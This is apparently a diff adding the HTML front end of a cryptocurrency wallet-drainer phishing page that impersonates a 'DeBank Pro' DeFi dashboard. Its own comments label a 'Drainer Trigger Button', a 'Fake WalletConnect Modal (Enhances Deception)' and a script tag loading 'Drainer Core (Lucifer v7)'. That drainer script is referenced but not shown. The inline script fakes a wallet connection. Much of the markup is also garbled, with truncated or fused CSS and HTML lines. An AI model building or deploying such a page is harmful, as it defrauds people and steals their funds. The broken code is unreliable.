@@ -1,0 +1,471 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DeBank Pro | The User-Based Web3 Community</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --a1a1a;
+            --accent: #3b82f6;
+            --text: #e5e7eb;
+            --text-secondary: #9ca3af;
+        }
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width:0px;
+            margin: auto;
+            padding: 2rem 1rem;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+        .logo img {
+            width: 32px;
+            height: 32px;
+: 0.5rem;
+            border-radius: 50%;
+        }
+        .nav {
+            display: flex;
+            gap: 2rem;
+        }
+        .nav a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+        .nav a:hover {
+            color: var(--accent);
+        }
+        .hero {
+            text-align: center;
+            margin-bottom:        }
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        .hero p {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 300px;
+            gap: 2rem;
+           3rem;
+        }
+        .portfolio, .sidebar {
+            background-color: var(--card);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .portfolio h2 {
+            font-size: 1.2rem;
+            margin-bottom: 1rem;
+            display: flex;
+           ;
+        }
+        .portfolio h2 i {
+            margin-right: 0.5rem;
+            color: var(--accent);
+        }
+        .portfolio-value {
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+        .portfolio-change {
+            color: #10b981;
+            font-size: 0.9rem;
+        }
+        .portfolio-change.negative {
+            color: #ef4444;
+        }
+        .token-list: 1.5rem;
+        }
+        .token-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 0;
+            border-bottom: 1px solid #333;
+        }
+        .token-info {
+            display: flex;
+            align-items: center;
+        }
+        .token-icon {
+            width: 32px;
+            height: 32px;
+            border-radius:  margin-right: 0.75rem;
+        }
+        .token-name {
+            font-weight: 500;
+        }
+        .token-symbol {
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+        .token-amount {
+            text-align: right;
+        }
+        .token-value {
+            font-weight: 500;
+        }
+        .token-change {
+            font-size: 0.8rem;
+            color: #81;
+        }
+        .token-change.negative {
+            color: #ef4444;
+        }
+        .sidebar h3 {
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+        }
+        .sidebar h3 i {
+            margin-right: 0.5rem;
+            color: var(--accent);
+        }
+        .connect-btn {
+            width: 100%;
+            background-color: var            color: white;
+            border: none;
+            padding: 0.75rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 1rem;
+        }
+        .connect-btn:hover {
+            background-color: #2563eb;
+        }
+        .connect-btn:disabled {
+            background74151;
+            cursor: not-allowed;
+        }
+        .wallet-info {
+            display: none;
+            margin-top: 1rem;
+            padding: 1rem;
+            background-color: #111;
+            border-radius: 8px;
+        }
+        .wallet-info.active {
+            display: block;
+        }
+        .wallet-address {
+            font-family: monospace;
+            font.9rem;
+            word-break: break-all;
+            margin-bottom: 0.5rem;
+        }
+        .wallet-balance {
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+        .recent-activity {
+            margin-top: 2rem;
+        }
+        .activity-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.75rem 0;
+           1px solid #333;
+        }
+        .activity-info {
+            display: flex;
+            align-items: center;
+        }
+        .activity-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            margin-right: 0.75rem;
+            background-color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .activity-details {
+            font-weight: 500;
+        }
+        .activity-details p {
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+        .activity-amount {
+            text-align: right;
+        }
+        .activity-amount.positive {
+            color: #10b981;
+        }
+        .activity-amount.negative {
+            color: #ef4444;
+        }
+        .footer {
+            text-align: center: 3rem;
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+ center;
+        }
+        .modal-content {
+            background-color: var(--card);
+            padding: 2rem;
+            border-radius: 12px;
+            width: 400px;
+            max-width: 90%;
+        }
+        .modal h3 {
+            margin-top: 0;
+            text-align: center;
+        }
+        .wallet-options {
+            display: grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        .wallet-option {
+            background-color: #2a2a2a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .wallet-option:hover {
+: var(--accent);
+        }
+        .wallet-option img {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 0.5rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo">
+                <img src="https://avatars.githubusercontent.com/u/35694601" alt">
+                DeBank Pro
+            </div>
+            <nav class="nav">
+                <a href="#">Dashboard</a>
+                <a href="#">Portfolio</a>
+                <a href="#">Transactions</a>
+                <a href="#">Analytics</a>
+                <a href="#">Settings</a>
+            </nav>
+        </header>
+
+        <section class="hero">
+            <h1>Your Web3 Portfolio, Simplified</h1>
+            <p next-gen DeFi dashboard with real-time analytics, gas optimization, and trusted by 500,000+ users.</p>
+        </section>
+
+        <div class="dashboard">
+            <div class="portfolio">
+                <h2><i class="fas fa-wallet"></i> Portfolio</h2>
+                <div class="portfolio-value">$12,456.78</div>
+                <div">+8.45% <i class="fas fa-arrow-up"></i></div>
+
+                <div class="token-list">
+                    <div class="token-item">
+                        <div class="token-info">
+                            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum" class="token-icon">
+                            <div>
+                                <div class="token-name">Ethereum</div>
+                                <-symbol">ETH</div>
+                            </div>
+                        </div>
+                        <div class="token-amount">
+                            <div class="token-value">2.456 ETH</div>
+                            <div class="token-change">$8,345.67</div>
+                        </div>
+                    </div>
+                    <div class="token-item">
+                        <div class="token-info">
+                            <img src="https://cryptologos.cc/logosd-coin-usdc-logo.png" alt="USD Coin" class="token-icon">
+                            <div>
+                                <div class="token-name">USD Coin</div>
+                                <div class="token-symbol">USDC</div>
+                            </div>
+                        </div>
+                        <div class="token-amount">
+                            <div class="token-value">1,234.56 USDC</div>
+                            <div class="token-change">$1,56</div>
+                        </div>
+                    </div>
+                    <div class="token-item">
+                        <div class="token-info">
+                            <img src="https://cryptologos.cc/logos/uniswap-uni-logo.png" alt="Uniswap" class="token-icon">
+                            <div>
+                                <div class="token-name">Uniswap</div>
+                                <div class="token-symbol">UNI</div>
+                            </div>
+                        </div>
+="token-amount">
+                            <div class="token-value">56.78 UNI</div>
+                            <div class="token-change positive">$347 <i class="fas fa-arrow-up"></i></div>
+                        </div>
+                    </div>
+                    <div class="token-item">
+                        <div class="token-info">
+                            <img src="https://cryptologos.cc/logos/aave-aave-logo.png" alt="Atoken-icon">
+                            <div>
+                                <div class="token-name">Aave</div>
+                                <div class="token-symbol">AAVE</div>
+                            </div>
+                        </div>
+                        <div class="token-amount">
+                            <div class="token-value">12.34 AAVE</div>
+                            <div class="token-change negative">$1,234.56 <i class="fas fa-arrow-down"></i></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sidebar">
+                <h3><i class="fas fa-plug"></i> Connect Wallet</h3>
+                <p style="margin-bottom: 1rem; color: var(--text-secondary);">Connect your wallet to view your portfolio and interact with DeFi protocols.</p>
+
+                <!-- Drainer Trigger Button -->
+="connect-btn interactBtn">Connect Wallet</button>
+
+                <div class="wallet-info">
+                    <div class="wallet-address">0x71C7656EC7ab88b098defB751B7401B5f6d8976F <div class="wallet-balance">$12,456.78</div>
+                </div>
+
+                <div class="recent-activity">
+                    <h3><i class="fas fa-clock"></i> Recent Activity</h3>
+                    <div class="activity-item">
+                        <div class="activity-info">
+                            <div class="activity-icon"><i class="fas fa-arrow-up"></i></div>
+                            <div class="activity-details">
+                               >Sent ETH</h4>
+                                <p>2 hours ago</p>
+                            </div>
+                        </div>
+                        <div class="activity-amount negative">-0.5 ETH</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-info">
+                            <div class="activity-icon" style="background-color: #10b981;"><i class="fas fa-arrow-down>
+                            <div class="activity-details">
+                                <h4>Received USDC</h4>
+                                <p>5 hours ago</p>
+                            </div>
+                        </div>
+                        <div class="activity-amount positive">+500 USDC</div>
+                    </div>
+                    <div class="activity-item">
+                        <div class="activity-info">
+                            <div class="activity-icon" style="background-color59e0b;"><i class="fas fa-exchange-alt"></i></div>
+                            <div class="activity-details">
+                                <h4>Swapped UNI → ETH</h4>
+                                <p>1 day ago</p>
+                            </div>
+                        </div>
+                        <div class="activity-amount">-10 UNI</div>
+                    </div>
+                </div>
+            </div>
+        <footer class="footer">
+            © 2025 DeBank Pro. All rights reserved. | <a href="#" style="color: var(--text-secondary);">Privacy Policy</a> | <a href="#" style="color: var(--text-secondary);">Terms of Service</a>
+        </footer>
+    </div>
+
+    <!-- Fake WalletConnect Modal (Enhances Deception) -->
+   modal" id="walletModal">
+        <div class="modal-content">
+            <h3>Connect a Wallet</h3>
+            <p style="text-align: center; color: var(--text-secondary); margin-bottom: 1.5rem;">Choose your preferred wallet provider.</p>
+            <div class="wallet-options">
+                <div class="wallet-option" onclick="connectWalletMask')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask">
+                    <div>MetaMask</div>
+                </div>
+                <div class="wallet-option" onclick="connectWallet('WalletConnect')">
+                    <img src="https://registry.wallet/logo/sm/230885e3-9f5b-49f5-9523-2f35b96d590.png" alt="WalletConnect">
+                    <div>WalletConnect</div>
+                </div>
+                <div class="wallet-option" onclick="connectWallet('Coinbase')">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Coinbase_App_Icon.png" alt="Coinbase Wallet">
+                    <div>Coinbase </div>
+                <div class="wallet-option" onclick="connectWallet('Trust')">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
+                    <div>Trust</div>
+                </div>
+            </div>
+            <button class="connect-btn" style="margin-top: 1.5rem;" onclick="closeModal()">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Drainer Core (Lucifer v7) -->
+    <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
+
+    <!-- Enhanced Fake Connection Logic -->
+    <script>
+        document.querySelector('.interactBtn').addEventListener('click', function() {
+            document.getElementByIdletModal').style.display = 'flex';
+        });
+
+        function closeModal() {
+            document.getElementById('walletModal').style.display = 'none';
+        }
+
+        function connectWallet(wallet) {
+            const btn = document.querySelector('.interactBtn');
+            btn.textContent = `Connecting to ${wallet}...`;
+            btn.disabled = true;
+
+            // Simulate connection delay (real drainer handles            setTimeout(() => {
+                document.querySelector('.wallet-info').classList.add('active');
+                btn.textContent = 'Connected';
+                closeModal();
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
